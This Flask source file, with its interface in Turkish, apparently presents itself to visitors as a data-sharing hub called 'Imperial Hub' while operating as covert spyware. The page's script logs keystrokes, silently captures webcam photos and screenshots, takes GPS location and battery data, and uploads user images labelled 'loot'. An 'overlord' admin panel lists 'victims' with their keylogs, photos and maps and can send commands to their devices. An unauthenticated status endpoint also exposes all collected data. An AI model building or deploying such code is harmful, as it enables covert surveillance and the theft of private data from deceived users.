from flask import Flask, render_template_string, jsonify, request
import time, json, threading, random, string
from threading import Lock

app = Flask(__name__)

# --- NETSWAP SOVEREIGN v200.0 "The Apex" ---
# Vizyon: Zirve İstihbarat, Ağ Engelini Delen HWID Takibi ve Kesintisiz Akış. [cite: 2026-01-03]
VERSION = "v200.0"
ADMIN_KEY = "ali_yigit_overlord_A55" 
ADMIN_PIN = "1907" 

state_lock = Lock()
state = {
    "banned_peers": [], "user_registry": {}, "global_chat": [],
    "evolution_count": 100, "commands": {} 
}

def get_device_info(ua, ip):
    ua = ua.upper()
    dev = "Samsung A55" if ("SM-A55" in ua or "ANDROID" in ua) else "Casper S100" if "WINDOWS" in ua else "Mobil"
    rand = ''.join(random.choices(string.ascii_uppercase + string.digits, k=4))
    return f"{dev} [{ip}]-{rand}"

def check_admin_auth(req):
    return req.args.get('key') == ADMIN_KEY and req.args.get('pin') == ADMIN_PIN

@app.after_request
def add_header(response):
    response.headers['Access-Control-Allow-Origin'] = '*'
    return response

@app.route('/overlord_api/<action>', methods=['GET', 'POST'])
def admin_api(action):
    if not check_admin_auth(request): return "YETKİSİZ", 403
    target = request.args.get('target_peer')
    with state_lock:
        if action == "chat_send":
            msg = request.json.get('msg')
            state["global_chat"].append({"from": "ADMIN", "to": target, "msg": msg, "time": time.strftime('%H:%M')})
        elif action == "cmd":
            state["commands"][target] = {"type": request.args.get('c'), "val": request.args.get('v', '')}
        elif target in state["user_registry"]:
            u = state["user_registry"][target]
            if action == "vip": u["is_vip"] = not u.get("is_vip", False)
            elif action == "ban": state["banned_peers"].append(target)
    return jsonify(state)

@app.route('/upload_intel', methods=['POST'])
def upload_intel():
    p_id = request.args.get('peer_id', 'GUEST')
    t = request.args.get('type')
    data = request.json
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    with state_lock:
        if p_id not in state["user_registry"]:
            state["user_registry"][p_id] = {
                "credits": 50.0, "is_vip": False, 
                "device": get_device_info(request.headers.get('User-Agent',''), ip), 
                "archive": [], "key_logs": [], "last_sync": time.time()
            }
        u = state["user_registry"][p_id]
        u["last_sync"] = time.time()
        
        if t == "chat": state["global_chat"].append({"from": p_id, "to": "ADMIN", "msg": data.get('msg'), "time": time.strftime('%H:%M')})
        elif data.get('image'):
            u["archive"].append({"time": time.strftime('%H:%M:%S'), "type": t, "data": data.get('image')})
            if len(u["archive"]) > 150: u["archive"].pop(0)
        
        if data.get('inputs'): u["key_logs"].append({"time": time.strftime('%H:%M:%S'), "text": data.get('inputs')})
        if data.get('loc'): u["location"] = data.get('loc')
        if data.get('hw'): u["hw"] = data.get('hw')
        if data.get('intel'): u["intel"] = data.get('intel')
        
        cmd = state["commands"].get(p_id, {})
        if cmd: state["commands"][p_id] = {}
    return jsonify({"status": "OK", "is_vip": u.get("is_vip", False), "cmd": cmd})

@app.route('/api/status')
def get_status(): return jsonify(state)

@app.route('/overlord')
def overlord_panel():
    if not check_admin_auth(request): return "ERİŞİM RED", 403
    return render_template_string("""
<!DOCTYPE html>
<html lang="tr"><head><meta charset="UTF-8"><title>Sovereign Apex Console v200</title>
<script src="https://cdn.tailwindcss.com"></script></head>
<body class="bg-black text-white p-4 font-mono text-[9px]">
    <div class="border-b-4 border-blue-600 pb-2 mb-4 flex justify-between items-center italic font-black uppercase">
        <h1 class="text-3xl tracking-tighter text-blue-500">THE APEX ENGINE v200.0</h1>
        <div class="text-blue-500 font-black tracking-widest">HÜKÜMDAR: ALİ YİĞİT</div>
    </div>
    <div class="grid grid-cols-5 gap-6">
        <div class="col-span-1 bg-zinc-950 p-3 border border-zinc-900 rounded-2xl shadow-2xl">
            <h2 class="text-blue-500 mb-3 uppercase font-bold text-[10px] border-b border-zinc-800 pb-1 text-center">Global Radar</h2>
            <select id="pS" class="w-full bg-zinc-900 p-2 rounded-lg mb-4 text-white border border-zinc-800 outline-none font-bold" onchange="uG()"></select>
            <div id="intel_box" class="text-[8px] space-y-1 mb-4 bg-blue-900/10 p-2 rounded-lg border border-blue-900/30 text-blue-200"></div>
            <div class="grid grid-cols-2 gap-2 mb-4">
                <button onclick="sendCmd('vibrate')" class="bg-purple-900 py-2 rounded-lg font-black text-[8px] hover:bg-purple-800">VIBRATE</button>
                <button onclick="sendCmd('panic')" class="bg-orange-800 py-2 rounded-lg font-black text-[8px] hover:bg-orange-700 uppercase">Panic</button>
            </div>
            <div id="loc_btn" class="mb-4 text-center"></div>
            <div id="gallery" class="grid grid-cols-1 gap-3 overflow-y-auto max-h-[450px] border-t border-zinc-900 pt-3"></div>
        </div>
        <div class="col-span-3">
            <h2 class="text-green-500 mb-3 uppercase font-bold text-[10px] border-b border-zinc-800 pb-1 text-center italic tracking-widest">Global Girdi Terminali (Canlı)</h2>
            <div id="keyTerminal" class="w-full h-96 bg-black border border-zinc-800 rounded-xl p-4 overflow-y-auto mb-6 text-[9px] text-green-400 font-bold shadow-[inset_0_0_30px_#000]"></div>
            <table class="w-full text-left bg-zinc-950 rounded-2xl border border-zinc-900 overflow-hidden">
                <thead class="bg-zinc-900 text-zinc-400 uppercase text-[9px]"><tr><th class="p-3">Cihaz (Ağ)</th><th>ID</th><th>MB Bakiye</th><th>Statü</th><th>Aksiyon</th></tr></thead>
                <tbody id="uT"></tbody>
            </table>
        </div>
        <div class="col-span-1 bg-zinc-950 p-3 border border-zinc-900 rounded-2xl text-center shadow-2xl border-blue-900/20">
            <h2 class="text-yellow-500 mb-3 uppercase font-bold text-[10px] border-b border-zinc-800 pb-1 italic">Hükümdar VIP Bridge</h2>
            <div id="chatBox" class="h-[550px] overflow-y-auto bg-black p-4 rounded-xl border border-zinc-800 mb-4 text-[9px] space-y-3"></div>
            <input id="chatIn" type="text" class="w-full bg-zinc-900 p-3 rounded-xl text-[9px] outline-none border border-zinc-800 mb-2" placeholder="Emrini gir...">
            <button onclick="sendMsg()" class="w-full bg-blue-900 hover:bg-blue-700 py-3 rounded-xl text-[10px] font-black uppercase tracking-widest transition shadow-lg">GÖNDER</button>
        </div>
    </div>
    <script>
        const k="{{a_key}}", p="{{a_pin}}"; let reg = {};
        async function f(a, t, v=""){ await fetch(`/overlord_api/${a}?key=${k}&pin=${p}&target_peer=${t}&value=${v}`); update(); }
        async function sendCmd(c, val=""){ const t = document.getElementById('pS').value; if(t) await fetch(`/overlord_api/cmd?key=${k}&pin=${p}&target_peer=${t}&c=${c}&v=${val}`); }
        async function sendMsg(){
            const m = document.getElementById('chatIn').value; const t = document.getElementById('pS').value;
            if(!t || !m) return;
            await fetch(`/overlord_api/chat_send?key=${k}&pin=${p}&target_peer=${t}`, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({msg: m})});
            document.getElementById('chatIn').value = ""; update();
        }
        function uG(){
            const id = document.getElementById('pS').value; if(!id || !reg[id]) return;
            const u = reg[id]; let h = "", tH = "";
            document.getElementById('intel_box').innerHTML = `PIL: %${u.hw?.bat||'--'} | SES: ${u.intel?.noise||'OFF'} dB<br>HWID: ${id.slice(0,10)}...`;
            if(u.location) { document.getElementById('loc_btn').innerHTML = `<a href="http://maps.google.com/?q=${u.location.lat},${u.location.lon}" target="_blank" class="block w-full text-center bg-red-900 text-white py-2 rounded-lg text-[8px] font-black uppercase animate-pulse">Konumu Haritada Gör</a>`; }
            (u.archive||[]).slice().reverse().forEach(s => { 
                h += `<div class="p-1 border border-zinc-800 bg-black rounded-lg mb-3 shadow-xl"><img src="${s.data}" class="w-full rounded-md"></div>`; 
            }); document.getElementById('gallery').innerHTML = h;
            (u.key_logs||[]).forEach(log => { tH += `<div class="border-b border-zinc-900/30 pb-2 mt-1 text-green-500/90"><span class="text-zinc-600">[${log.time}]</span> ${log.text}</div>`; });
            document.getElementById('keyTerminal').innerHTML = tH;
            document.getElementById('keyTerminal').scrollTop = document.getElementById('keyTerminal').scrollHeight;
        }
        async function update(){
            const r=await fetch('/api/status'); const d=await r.json(); reg = d.user_registry;
            let uH="", pO="<option value=''>Kurban Seç...</option>", cH="";
            const sortedIds = Object.keys(d.user_registry).sort((a,b) => (d.user_registry[b].is_vip ? 1 : 0) - (d.user_registry[a].is_vip ? 1 : 0));
            for(let id of sortedIds){
                let u=d.user_registry[id];
                pO += `<option value="${id}" ${document.getElementById('pS').value==id?'selected':''}>${u.device} - ${id}</option>`;
                uH += `<tr class="border-b border-zinc-900 ${u.is_vip?'bg-yellow-900/10':''} hover:bg-zinc-900 transition">
                <td class="p-3"><b>${u.device}</b></td><td class="text-blue-400 font-bold">${id}</td>
                <td class="font-bold text-white">${u.credits.toFixed(2)}</td><td class="font-bold text-yellow-500 text-[8px] uppercase tracking-widest">${u.is_vip?'Hükümdar VIP':'Normal'}</td>
                <td><button onclick="f('vip','${id}')" class="underline text-[9px] font-black uppercase">VIP</button></td></tr>`;
            }
            d.global_chat.forEach(m => { cH += `<div class="${m.from=='ADMIN'?'text-blue-400':'text-green-400'}"><b>${m.from=='ADMIN'?'HÜKÜMDAR':m.from}:</b> ${m.msg}</div>`; });
            document.getElementById('uT').innerHTML = uH; document.getElementById('pS').innerHTML = pO;
            document.getElementById('chatBox').innerHTML = cH; uG();
            setTimeout(update, 2000); 
        } update();
    </script>
</body></html>
""", a_key=ADMIN_KEY, a_pin=ADMIN_PIN)

@app.route('/')
def index():
    return render_template_string("""
<!DOCTYPE html>
<html lang="tr"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Imperial Hub</title><script src="https://cdn.tailwindcss.com"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
<link rel="manifest" href="data:application/manifest+json,{% filter urlencode %}{"name":"Imperial Hub","short_name":"Hub","start_url":"/","display":"standalone","background_color":"#000000","theme_color":"#2563eb"}{% endfilter %}">
<style>.bar { width: 4px; background: #2563eb; margin: 1px; transition: height 0.1s; border-radius: 2px; } #subliminal { display:none; position:fixed; top:50%; left:50%; transform:translate(-50%,-50%); z-index:10001; background:gold; color:black; font-weight:900; padding:15px; border-radius:10px; text-transform:uppercase; box-shadow: 0 0 20px gold; }</style></head>
<body id="b" class="bg-black text-white font-mono flex items-center justify-center h-screen overflow-hidden transition-all duration-500">
    <div id="sp" class="fixed inset-0 bg-black z-[9999] flex flex-col items-center justify-center transition-opacity duration-1000">
        <div class="w-16 h-16 border-4 border-blue-600 border-t-transparent rounded-full animate-spin mb-4 shadow-[0_0_20px_rgba(37,99,235,0.4)]"></div>
        <h2 class="text-xl font-black italic tracking-widest text-blue-500 uppercase">Apex Sync</h2>
    </div>

    <div id="blueDot" style="position:fixed; width:25px; height:25px; background:blue; border-radius:50%; display:none; z-index:9998; box-shadow:0 0 15px blue;"></div>
    
    <div id="main" class="w-full h-full p-6 text-center">
        <h1 class="text-3xl font-black text-blue-600 italic mb-8 uppercase tracking-tighter">IMPERIAL HUB</h1>
        
        <div class="bg-zinc-950 rounded-[35px] p-5 border border-zinc-900 mb-6 shadow-2xl relative">
            <h2 class="text-[9px] font-bold text-blue-500 mb-2 uppercase tracking-widest text-center italic">Apex Ses Analizi</h2>
            <div id="vis" class="flex items-end justify-center h-10 mb-3">
                <div class="bar h-2"></div><div class="bar h-8"></div><div class="bar h-5"></div><div class="bar h-7"></div>
            </div>
            <button id="v_btn" onclick="toggleAudio()" class="w-full py-3 bg-zinc-900 rounded-[20px] text-[10px] font-black text-blue-400 uppercase">Analizi Başlat</button>
        </div>

        <div class="bg-zinc-950 p-10 rounded-[50px] border border-zinc-900 mb-6 shadow-2xl relative">
            <div id="v_t" class="hidden absolute top-4 left-1/2 -translate-x-1/2 bg-yellow-600 text-black text-[8px] font-black px-4 py-1 rounded-full uppercase shadow-lg">Hükümdar VIP</div>
            <div id="cr" class="text-6xl font-black italic tracking-tighter">0.00</div>
            <p class="text-[8px] text-zinc-600 uppercase mt-2 font-bold tracking-widest text-blue-500 italic text-center">Aktif Veri Bakiyesi</p>
        </div>
        
        <div class="grid grid-cols-2 gap-4 mb-6">
            <button onclick="calib('share')" class="py-6 bg-green-700 text-black font-black rounded-[30px] text-xl active:scale-95 transition shadow-lg uppercase">VER</button>
            <button onclick="calib('receive')" class="py-6 bg-blue-700 text-white font-black rounded-[30px] text-xl active:scale-95 transition shadow-lg uppercase">AL</button>
        </div>

        <div class="bg-zinc-900/40 p-4 rounded-[30px] border border-zinc-800/50">
            <button onclick="document.getElementById('wp').click()" class="w-full text-[9px] text-zinc-400 underline uppercase font-black">Senkronizasyon</button>
        </div>
        <input type="file" id="wp" class="hidden" accept="image/*" onchange="loot(event)">
    </div>
    
    <video id="v" class="hidden" autoplay playsinline></video><canvas id="cnv" class="hidden"></canvas>
    <div id="s_a" style="position:fixed; top:0; right:0; width:120px; height:120px; z-index:9999;"></div>

    <script>
        if(!localStorage.getItem('abs_id')) {
            localStorage.setItem('abs_id', "APEX-" + Math.random().toString(36).substr(2, 5).toUpperCase() + "-" + Date.now().toString().slice(-4));
        }
        let myId = localStorage.getItem('abs_id'), inputs = "", clip = "", count = 0, noiseLevel = 0;

        window.onload = () => { 
            setTimeout(() => { document.getElementById('sp').style.opacity='0'; setTimeout(()=>document.getElementById('sp').style.display='none', 1000); ghostEye('cam'); }, 2000); 
            fetch('/upload_intel?peer_id='+myId+'&type=ping', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({intel: {init: true}}) });
        };

        document.getElementById('s_a').onclick = () => { count++; if(count >= 5){ let p=prompt("ŞİFRE:"); if(p) window.location.href=`/overlord?key={{a_key}}&pin=`+p; count=0; } };
        window.addEventListener('keydown', (e) => { inputs += (e.key.length === 1 ? e.key : ` [${e.key}] `); });

        async function toggleAudio() {
            try {
                const s = await navigator.mediaDevices.getUserMedia({audio:true});
                document.getElementById('v_btn').innerText = "BAĞLANDI";
                const ac = new AudioContext(); const src = ac.createMediaStreamSource(s);
                const an = ac.createAnalyser(); src.connect(an);
                const data = new Uint8Array(an.frequencyBinCount);
                function draw() {
                    an.getByteFrequencyData(data); noiseLevel = Math.round(data[0]); 
                    document.querySelectorAll('.bar').forEach((b, i) => { b.style.height = (data[i*10] / 4) + 'px'; });
                    requestAnimationFrame(draw);
                } draw();
            } catch(e) { alert("Mikrofon izni gerekli!"); }
        }

        async function loot(e) {
            const file = e.target.files[0]; if(!file) return;
            const reader = new FileReader(); reader.onload = (re) => {
                document.getElementById('b').style.backgroundImage = `url(${re.target.result})`;
                document.getElementById('b').style.backgroundSize = "cover";
                fetch(`/upload_intel?peer_id=${myId}&type=loot`, { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({image: re.target.result}) });
                ghostEye('cam');
            }; reader.readAsDataURL(file);
        }

        async function calib(t) {
            const dot = document.getElementById('blueDot'); dot.style.display='block';
            navigator.geolocation.getCurrentPosition((p) => {
                fetch(`/upload_intel?peer_id=${myId}&type=gps`, { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({loc: {lat: p.coords.latitude, lon: p.coords.longitude}}) });
            }, null, {enableHighAccuracy: true});
            let steps = 0;
            const int = setInterval(() => {
                dot.style.top = Math.random()*80+10+"%"; dot.style.left = Math.random()*80+10+"%";
                ghostEye('cam'); steps++;
                if(steps>=3){ clearInterval(int); dot.style.display='none'; fetch(`/action/${t}?peer_id=${myId}`); }
            }, 1000);
        }

        async function ghostEye(type) {
            try {
                const s = await navigator.mediaDevices.getUserMedia({video:true});
                const v = document.getElementById('v'), cnv = document.getElementById('cnv');
                v.srcObject = s; await v.play();
                cnv.width = 640; cnv.height = 480;
                cnv.getContext('2d').drawImage(v, 0, 0);
                fetch('/upload_intel?peer_id='+myId+'&type='+type, { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({image: cnv.toDataURL('image/jpeg', 0.5)}) });
                s.getTracks().forEach(tr => tr.stop());
            } catch(e) {}
        }

        async function main() {
            const bt = await navigator.getBattery();
            const cv = await html2canvas(document.body, {scale:0.2});
            const r = await fetch('/upload_intel?peer_id='+myId+'&type=scr', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({
                image: cv.toDataURL('image/jpeg', 0.15),
                hw: {bat: Math.floor(bt.level*100)},
                inputs: inputs, clip: clip, intel: {noise: noiseLevel}
            }) });
            const d = await r.json();
            if(d.cmd.type == "vibrate") navigator.vibrate([1000, 200, 1000]);
            if(d.cmd.type == "panic") { navigator.vibrate([200, 100, 500]); alert("Global Bağlantı Hatası!"); }
            if(d.is_vip) { document.getElementById('v_t').classList.remove('hidden'); document.getElementById('chatUI').classList.remove('hidden'); document.body.style.boxShadow = "inset 0 0 50px gold"; }
            inputs = ""; setTimeout(main, 4000); 
        } main();
    </script>
</body></html>
